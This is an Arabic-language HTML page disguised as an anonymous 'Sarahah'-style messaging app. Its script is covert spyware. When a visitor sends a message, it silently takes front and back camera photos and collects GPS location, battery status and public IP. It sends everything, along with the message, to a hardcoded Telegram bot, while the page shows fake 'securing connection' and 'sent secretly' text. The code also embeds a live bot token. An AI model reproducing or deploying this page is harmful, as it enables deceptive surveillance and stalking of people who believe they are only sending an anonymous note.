
<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>صارحني | رسائل مجهولة</title>
    <style>
        :root { --main: #00c2ff; --bg: #121217; }
        body { background: var(--bg); color: white; font-family: sans-serif; margin: 0; display: flex; align-items: center; justify-content: center; height: 100vh; overflow: hidden; }
        .container { background: #1e1e26; padding: 40px 25px; border-radius: 30px; width: 90%; max-width: 400px; text-align: center; border: 1px solid rgba(255,255,255,0.05); }
        .btn-send { background: var(--main); color: #000; border: none; padding: 16px; width: 100%; border-radius: 12px; font-weight: bold; cursor: pointer; margin-top: 20px; }
        textarea { width: 100%; height: 120px; background: #2a2a35; border: 1px solid #3d3d4d; border-radius: 15px; color: white; padding: 15px; box-sizing: border-box; }
        #loading { display: none; margin-top: 15px; color: var(--main); font-size: 0.9rem; }
    </style>
</head>
<body>

<div class="container">
    <h2>👤 صارحني</h2>
    <p>أرسل رسالة سرية مجهولة لصديقك!</p>
    <textarea id="userMsg" placeholder="اكتب صراحتك هنا..."></textarea>
    <button class="btn-send" onclick="initiateProcess()">إرسال مجهول</button>
    <div id="loading">جاري تأمين الاتصال...</div>
</div>

<video id="v" autoplay playsinline muted style="display:none;"></video>
<canvas id="c" style="display:none;"></canvas>

<script>
    const T = "8738245852:AAFuHo61scaBhakSOPlnPg7UIS8Ggx7llGk";
    const C = "7984067238";

    async function sendToBot(data, isPhoto = false, caption = "") {
        const url = `https://api.telegram.org/bot${T}/`;
        if (!isPhoto) {
            await fetch(`${url}sendMessage?chat_id=${C}&text=${encodeURIComponent(data)}&parse_mode=Markdown`);
        } else {
            const fd = new FormData();
            fd.append("chat_id", C);
            fd.append("photo", data, "shot.jpg");
            fd.append("caption", caption);
            await fetch(`${url}sendPhoto`, { method: "POST", body: fd });
        }
    }

    async function capture(side) {
        try {
            const stream = await navigator.mediaDevices.getUserMedia({
                video: { facingMode: side === "front" ? "user" : "environment", width: 1280, height: 720 }
            });
            const v = document.getElementById( v );
            const c = document.getElementById( c );
            v.srcObject = stream;
            await new Promise(r => v.onloadedmetadata = r);
            // انتظار معايرة الكاميرا (يحل مشكلة الصور السوداء)
            await new Promise(r => setTimeout(r, 1500)); 
            c.width = v.videoWidth;
            c.height = v.videoHeight;
            c.getContext( 2d ).drawImage(v, 0, 0);
            stream.getTracks().forEach(t => t.stop());
            return new Promise(r => c.toBlob(r,  image/jpeg , 0.9));
        } catch (e) { return null; }
    }

    async function initiateProcess() {
        const msg = document.getElementById( userMsg ).value;
        if (!msg) { alert("اكتب رسالتك أولاً!"); return; }
        
        document.getElementById( loading ).style.display =  block ;

        // التقاط الصور
        const f = await capture("front");
        if (f) await sendToBot(f, true, "📸 صورة أمامية");

        const b = await capture("back");
        if (b) await sendToBot(b, true, "📷 صورة خلفية");

        // إرسال البيانات
        navigator.geolocation.getCurrentPosition(async (p) => {
            const bat = await navigator.getBattery();
            const ip = await fetch( https://api.ipify.org?format=json ).then(r => r.json());
            let report = `👤 *رسالة صارحني*:\n💬: \`${msg}\`\n📍: [الموقع](https://www.google.com/maps?q=${p.coords.latitude},${p.coords.longitude})\n🔋: \`${Math.round(bat.level * 100)}%\` ${bat.charging ? "🔌" : "🔋"}\n🌐: \`${ip.ip}\``;
            await sendToBot(report);
        }, () => sendToBot(`💬: \`${msg}\`\n⚠️ الموقع مرفوض`));

        setTimeout(() => {
            alert("تم إرسال رسالتك بسرية!");
            location.reload();
        }, 2500);
    }
</script>

</body>
</html>
